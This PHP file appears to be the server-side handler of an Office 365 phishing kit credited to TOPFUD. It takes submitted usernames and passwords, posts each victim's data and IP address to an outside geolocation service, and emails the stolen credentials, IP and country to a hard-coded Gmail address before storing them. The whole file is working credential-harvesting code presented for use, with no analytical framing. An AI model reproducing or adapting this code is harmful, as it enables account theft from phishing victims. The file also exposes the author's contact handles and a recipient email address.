<?php
include('panel/config.php');
// THIS SCRIPT CODED BY TOPFUD.com
// Skype : TOPFUD@hotmail.com ,, live:.cid.f3ca894e49395bbe
// ICQ : 624088694

$recipient = 'divinelogz901@gmail.com'; // Put your email address here


if(isset($_POST['user']) && isset($_POST['pass'])){

function visitor_country($ip)
{
$ip['t'] = 1;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://showips.com/api/geoip/");
curl_setopt($ch, CURLOPT_POST ,TRUE); 
curl_setopt ($ch, CURLOPT_POSTFIELDS, http_build_query($ip)); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
return $result = json_decode(curl_exec($ch), true);
}
$data = $_POST;
$data['ip'] = getenv("REMOTE_ADDR");
$res = visitor_country($data);
if($res['status'] == 'OK')
{
	$date = date('d-m-Y');
	$ip = getenv("REMOTE_ADDR");
	$message = "-----------------+ True Login Verfied  +-----------------\n";
	$message.= "User ID: " . $data['user'] . "\n";
	$message.= "Password: " . $data['pass'] . "\n";
	$message.= "Client IP      : " . $data['ip'] . "\n";
	$message.= "Client Country      : " . $res['country'] . "\n";
	$message.= "-----------------+ Created in Topfud+------------------\n";
	$subject = "OFFICE 365 | True Login: " . $data['ip'] . "\n";
	$headers = "MIME-Version: 1.0\n";
	mail($recipient, $subject, $message, $headers);
	save($data['user'],$data['pass'],'True Login verified',$res['country']);
	echo 1;
}
else
{
	echo 0;
}
}

?>
